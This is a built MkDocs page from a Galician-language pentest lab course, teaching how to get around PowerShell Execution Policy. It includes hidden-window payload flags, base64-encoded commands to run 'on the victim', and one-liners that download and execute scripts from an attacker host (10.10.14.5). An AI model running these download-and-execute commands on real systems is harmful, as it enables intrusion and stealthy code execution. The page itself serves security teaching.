+  <span class="md-ellipsis">
+    Vuln Lab AD-DC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab AD-DC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/1-GUIA_MESTRA_VULN_HE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía mestra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1_3" id="__nav_3_3_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/8-ATAQUE_ESPECIFICO_SILVER_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Silver Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/9-ATAQUE_ESPECIFICO_GOLDEN_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Golden Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/6-ANALISE_USUARIOS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Análise usuarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introducion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introdución
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preparacion-script-de-exemplo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preparación: Script de Exemplo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#comprobar-o-estado-actual" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comprobar o Estado Actual
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Comprobar o Estado Actual">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#orde-de-prioridade" class="md-nav__link">
+    <span class="md-ellipsis">
+      Orde de Prioridade
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-politicas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tipos de Políticas
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-1-cambio-de-ambito-process-scope" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 1: Cambio de Ámbito (Process Scope)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-2-flags-de-lina-de-comandos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 2: Flags de Liña de Comandos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-3-execucion-en-memoria-fileless" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 3: Execución en Memoria (Fileless)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Método 3: Execución en Memoria (Fileless)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pipe-desde-get-content" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pipe desde Get-Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descarga-e-execucion-remota" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descarga e Execución Remota
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-4-bypass-por-codificacion-encodedcommand" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 4: Bypass por Codificación (EncodedCommand)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Método 4: Bypass por Codificación (EncodedCommand)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-preparar-o-comando-escolle-a-tua-plataforma" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Preparar o comando (Escolle a túa plataforma)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-executar-na-vitima" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Executar na vítima
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-de-tecnicas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resumo de Técnicas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#referencia-oficial" class="md-nav__link">
+    <span class="md-ellipsis">
+      Referencia oficial
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="evasion-de-politicas-de-execucion-en-powershell">Evasión de Políticas de Execución en PowerShell</h1>
+<h2 id="introducion">Introdución</h2>
+<p>Un dos erros máis comúns ao comezar a traballar con PowerShell en auditorías ou laboratorios é o seguinte:</p>
+<blockquote>
+<p><em>File script.ps1 cannot be loaded because running scripts is disabled on this system.</em></p>
+</blockquote>
+<p>Isto débese á <strong>Execution Policy</strong> (Política de Execución), unha característica de seguridade deseñada para evitar a execución accidental de scripts, pero que <strong>non é unha barreira de seguridade</strong> real contra un atacante.</p>
+<p>Este documento detalla como identificar, comprender e saltar estas restricións sen necesidade de permisos de Administrador.</p>
+<h2 id="preparacion-script-de-exemplo">Preparación: Script de Exemplo</h2>
+<p>Para probar os métodos descritos neste documento, crea un ficheiro chamado <code>script.ps1</code> no cartafol onde esteas a traballar co seguinte contido simple. Este servirá para verificar cando logramos saltar a restrición.</p>
+<p><strong>Contido de <code>script.ps1</code>:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Write-Host</span> <span class="s2">&quot;Bypass realizado con éxito! O script executouse.&quot;</span> <span class="n">-ForegroundColor</span> <span class="n">Green</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">Get-Date</span>
+</span></code></pre></div></p>
+<h2 id="comprobar-o-estado-actual">Comprobar o Estado Actual</h2>
+<p>Antes de intentar un bypass, é útil saber en que estado se atopa a máquina.</p>
+<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Get-ExecutionPolicy</span>
+</span></code></pre></div>
+<strong>Nota importante:</strong> Ao executar este comando sen parámetros, PowerShell devolve a <strong>Política Efectiva</strong>. Isto non se corresponde necesariamente cun único ámbito, senón que é a <strong>política "gañadora"</strong> despois de avaliar todas as prioridades (GPO, Usuario, Máquina, etc.).</p>
+<p>Exemplo de saída:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Restricted
+</span></code></pre></div></p>
+<p>Ou para ver o detalle por ámbitos e saber de onde vén esa restrición:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-ExecutionPolicy</span> <span class="n">-List</span>
+</span></code></pre></div>
+<p>Exemplo de saída:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>        Scope ExecutionPolicy
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>        ----- ---------------
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>MachinePolicy       Undefined
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>   UserPolicy       Undefined
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>      Process       Undefined
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>  CurrentUser       Undefined
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a> LocalMachine       Undefined
+</span></code></pre></div></p>
+<h3 id="orde-de-prioridade">Orde de Prioridade</h3>
+<p>É fundamental entender que <strong>a prioridade aplícase de arriba a abaixo</strong>. PowerShell revisa a lista nesta orde e aplica a primeira política que <strong>non</strong> sexa <code>Undefined</code>. O resultado desta comprobación é o que mostra o comando <code>Get-ExecutionPolicy</code> básico.</p>
+<ol>
+<li><strong>MachinePolicy</strong> (GPO): Prioridade máxima. Establecida por directivas de grupo.</li>
+<li><strong>UserPolicy</strong> (GPO): Establecida por directivas de grupo para o usuario.</li>
+<li><strong>Process</strong> (Sesión actual): Afecta só á ventá actual (aquí é onde actuamos para o bypass).</li>
+<li><strong>CurrentUser</strong>: Configuración no rexistro do usuario actual.</li>
+<li><strong>LocalMachine</strong>: Configuración global do equipo (prioridade mínima).</li>
+</ol>
+<p><em>Se <code>Process</code> está definido como <code>Bypass</code>, anulará o que diga <code>LocalMachine</code>, pero non podería anular unha <code>MachinePolicy</code> se esta estivese definida por un administrador de dominio.</em></p>
+<h3 id="tipos-de-politicas">Tipos de Políticas</h3>
+<ul>
+<li><strong>Undefined</strong>: Non hai ningunha política de execución establecida para o ámbito actual. Se todos os ámbitos son <code>Undefined</code>, a política efectiva por defecto é <strong>Restricted</strong> (en clientes Windows) ou <strong>RemoteSigned</strong> (en servidores).</li>
+<li><strong>Default</strong>: Establece a política de execución predeterminada. En clientes Windows equivale a <strong>Restricted</strong>, mentres que en Windows Server equivale a <strong>RemoteSigned</strong>.</li>
+<li><strong>Restricted</strong>: Non permite executar ningún script (valor por defecto en Windows cliente). Só permite comandos individuais.</li>
+<li><strong>RemoteSigned</strong>: Scripts creados localmente execútanse sen problemas; os descargados de Internet requiren estar asinados por un editor de confianza.</li>
+<li><strong>AllSigned</strong>: Todos os scripts (locais e remotos) requiren firma dixital.</li>
+<li><strong>Unrestricted</strong>: Permite a execución de calquera script. Só amosa unha advertencia para scripts descargados de Internet non asinados.</li>
+<li><strong>Bypass</strong>: Nada está bloqueado e non hai advertencias nin preguntas.</li>
+</ul>
+<h2 id="metodo-1-cambio-de-ambito-process-scope">Método 1: Cambio de Ámbito (Process Scope)</h2>
+<p>Este é o método máis limpo e profesional para un pentester que ten acceso interactivo a unha shell, pero <strong>non ten permisos de Administrador</strong>.</p>
+<div class="admonition tip">
+<p class="admonition-title">O Truco do Scope Process</p>
+<p>Por defecto, intentar cambiar a política afecta a toda a máquina (Rexistro), o que require permisos de Admin.  </p>
+<p>Porén, o parámetro <code>-Scope Process</code> aplica o cambio <strong>só á variable de entorno da sesión actual</strong>. Isto non require privilexios elevados e desaparece ao pechar a ventá.</p>
+</div>
+<p><strong>Comando:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">-Scope</span> <span class="k">Process</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Force</span>
+</span></code></pre></div></p>
+<p><strong>Verificación:</strong>
+Podes comprobar que funcionou executando de novo o listado. Verás que <code>Process</code> agora manda sobre <code>LocalMachine</code> (ou sobre <code>Undefined</code>) porque está máis arriba na lista de prioridades:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>        Scope ExecutionPolicy
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>        ----- ---------------
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>MachinePolicy       Undefined
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>   UserPolicy       Undefined
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>      Process          Bypass  &lt;-- A túa sesión (Gaña aos de abaixo)
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>  CurrentUser       Undefined
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a> LocalMachine      Restricted  (Ou Undefined)
+</span></code></pre></div>
+<h2 id="metodo-2-flags-de-lina-de-comandos">Método 2: Flags de Liña de Comandos</h2>
+<p>Se vas executar un script "one-liner" ou chamas a PowerShell desde unha CMD/Shell reversa, podes pasar a política como argumento. Isto non cambia a configuración persistente do sistema.</p>
+<p><strong>Comando básico:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>powershell<span class="w"> </span>-ExecutionPolicy<span class="w"> </span>Bypass<span class="w"> </span>-File<span class="w"> </span>script.ps1
+</span></code></pre></div></p>
+<p><strong>Versión abreviada (moi común en exploits):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>powershell<span class="w"> </span>-ep<span class="w"> </span>bypass<span class="w"> </span>-f<span class="w"> </span>script.ps1
+</span></code></pre></div></p>
+<p><strong>Versión invisible (para payloads):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>powershell<span class="w"> </span>-nop<span class="w"> </span>-w<span class="w"> </span>hidden<span class="w"> </span>-ep<span class="w"> </span>bypass<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;comando...&quot;</span>
+</span></code></pre></div>
+*   <code>-nop</code>: NoProfile (carga máis rápido e evita cargar scripts de perfil do usuario).
+*   <code>-w hidden</code>: WindowStyle Hidden (oculta a ventá).</p>
+<div class="admonition info">
+<p class="admonition-title">Detalle Técnico: WindowStyle Hidden</p>
+<p>O uso de <code>-w hidden</code> ten matices importantes:</p>
+<ol>
+<li><strong>O "Flash":</strong> A miúdo vese un breve parpadeo da ventá negra antes de desaparecer. Isto ocorre porque a ventá créase antes de que PowerShell procese o argumento de ocultala.</li>
+<li><strong>Oculta os ERROS:</strong> Se o teu comando falla (ex: a ruta non existe ou non tes permisos), a ventá abrirase, mostrará o erro e pecharase tan rápido que non o verás. <strong>Nunca uses <code>-w hidden</code> mentres estás probando o payload.</strong></li>
+<li><strong>Visibilidade do Proceso:</strong> Aínda que a ventá non se vexa na barra de tarefas, o proceso <code>powershell.exe</code> <strong>segue visible</strong> no Administrador de Tarefas.</li>
+<li><strong>Exemplo práctico:</strong> Se executas <code>powershell -w hidden -c "echo ola &gt; c:\ruta\non\existe.txt"</code>, non se creará nada e non verás ningún aviso. Debes probar primeiro sen o flag oculto.</li>
+</ol>
+</div>
+<h2 id="metodo-3-execucion-en-memoria-fileless">Método 3: Execución en Memoria (Fileless)</h2>
+<p>A Execution Policy bloquea ficheiros <code>.ps1</code> no disco. Se les o contido do ficheiro e llo pasas directamente ao intérprete, a política a miúdo ignórase porque non se está "executando un ficheiro", senón interpretando cadeas de texto.</p>
+<h3 id="pipe-desde-get-content">Pipe desde <code>Get-Content</code></h3>
+<p>Se tes o ficheiro no disco pero non podes executalo:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="nb">Invoke-Expression</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="c"># Ou a versión curta:</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nb">gc </span><span class="p">.\</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="nb">iex</span>
+</span></code></pre></div></p>
+<h3 id="descarga-e-execucion-remota">Descarga e Execución Remota</h3>
+<p>A técnica estándar para non tocar disco. O script descárgase como string e execútase inmediatamente.
+<em>Nota: Asegúrate de cambiar <code>10.10.14.5</code> pola IP da túa máquina atacante.</em></p>
+<p><strong>Opción Moderna (Recomendada - PS v3.0+):</strong>
+Utiliza alias para comandos máis curtos. <code>irm</code> é preferible porque obtén só o contido puro.
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># irm = Invoke-RestMethod | iex = Invoke-Expression</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">irm </span><span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="nb">iex</span>
+</span></code></pre></div></p>
+<p>Tamén podes atopar variantes con <code>iwr</code> (<em>Invoke-WebRequest</em>). Se che dá un erro sobre o "Internet Explorer engine", debes engadir <code>-UseBasicParsing</code>.
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># Engadimos -UseBasicParsing para evitar erros se non hai IE configurado</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="nb">iex</span>
+</span></code></pre></div></p>
+<div class="admonition tip">
+<p class="admonition-title">Diferenza: irm vs iwr</p>
+<ul>
+<li><strong><code>irm</code> (Invoke-RestMethod):</strong> Devolve directamente o <strong>contido</strong> (o corpo da resposta). É o ideal para scripts porque entrega o código limpo para o <code>iex</code>.</li>
+<li><strong><code>iwr</code> (Invoke-WebRequest):</strong> Devolve un <strong>obxecto de resposta</strong> completo (con cabeceiras, estado HTTP, etc.). Aínda que funciona no pipe, descarga máis metadatos innecesarios e a miúdo require <code>-UseBasicParsing</code>.</li>
+</ul>
+</div>
+<p><strong>Opción Clásica (Legacy - PS v2.0):</strong>
+Útil só en sistemas moi antigos (ex. Windows 7 sen actualizar).
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/script.ps1&#39;</span><span class="p">)</span>
+</span></code></pre></div></p>
+<h2 id="metodo-4-bypass-por-codificacion-encodedcommand">Método 4: Bypass por Codificación (EncodedCommand)</h2>
+<p>Moi útil para evitar problemas de sintaxe con caracteres especiais ou para ofuscar o comando básico. Non salta a política per se, pero úsase xunto con flags de bypass para inxeccións limpas.</p>
+<h3 id="1-preparar-o-comando-escolle-a-tua-plataforma">1. Preparar o comando (Escolle a túa plataforma)</h3>
+<p><strong>Opción A: Desde Windows (PowerShell)</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c"># Lembra substituír 10.10.14.5 pola túa IP de atacante</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nv">$cmd</span> <span class="p">=</span> <span class="s2">&quot;irm http://10.10.14.5/script.ps1 | iex&quot;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nv">$bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nv">$encoded</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">)</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="nb">Write-Host</span> <span class="nv">$encoded</span>
+</span></code></pre></div></p>
+<p><strong>Opción B: Desde Linux / Kali (Bash)</strong>
+En Linux é necesario converter o texto a <strong>UTF-16LE</strong> antes de facer o Base64 para que PowerShell o entenda:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;irm http://10.10.14.5/script.ps1 | iex&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>iconv<span class="w"> </span>-t<span class="w"> </span>UTF-16LE<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span>
+</span></code></pre></div></p>
+<h3 id="2-executar-na-vitima">2. Executar na vítima</h3>
+<p>Copia a cadea xerada e execútaa na máquina obxectivo:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>powershell<span class="w"> </span>-ep<span class="w"> </span>bypass<span class="w"> </span>-EncodedCommand<span class="w"> </span>&lt;CADEA_BASE64...&gt;
+</span></code></pre></div></p>
+<h2 id="resumo-de-tecnicas">Resumo de Técnicas</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Método</th>
+<th style="text-align: left;">Comando Clave</th>
+<th style="text-align: left;">Vantaxe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Process Scope</strong></td>
+<td style="text-align: left;"><code>Set-ExecutionPolicy -Scope Process ...</code></td>
+<td style="text-align: left;">Non require Admin, afecta a toda a sesión actual.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CLI Flag</strong></td>
+<td style="text-align: left;"><code>powershell -ep bypass ...</code></td>
+<td style="text-align: left;">Rápido, ideal para one-liners ou scripts de inicio.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Pipe / IEX</strong></td>
+<td style="text-align: left;"><code>cat script.ps1 \| iex</code></td>
+<td style="text-align: left;">Evita a restrición de ficheiros (Fileless).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Web Download</strong></td>
+<td style="text-align: left;"><code>irm http://... \| iex</code></td>
+<td style="text-align: left;">Descarga e executa en memoria sen tocar disco.</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Consideracións de Seguridade</p>
+<p>Aínda que estes métodos saltan a <em>Execution Policy</em>, <strong>non</strong> evitan a detección de antivirus (Microsoft Defender) nin AMSI (Antimalware Scan Interface). </p>
+<p>Se usas <code>-ep bypass</code> e cargas un script coñecido como malicioso (ex. Mimikatz ou <a href="../nishang/" target="_blank">Nishang</a> sen ofuscar), Defender bloquearao pola firma do contido, non pola política de execución.</p>
+</div>
+<h2 id="referencia-oficial">Referencia oficial</h2>
+<ul>
+<li><a href="https://learn.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.5" target="_blank">about_Execution_Policies</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../../js/opera.js"></script>
+      
+        <script src="../../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
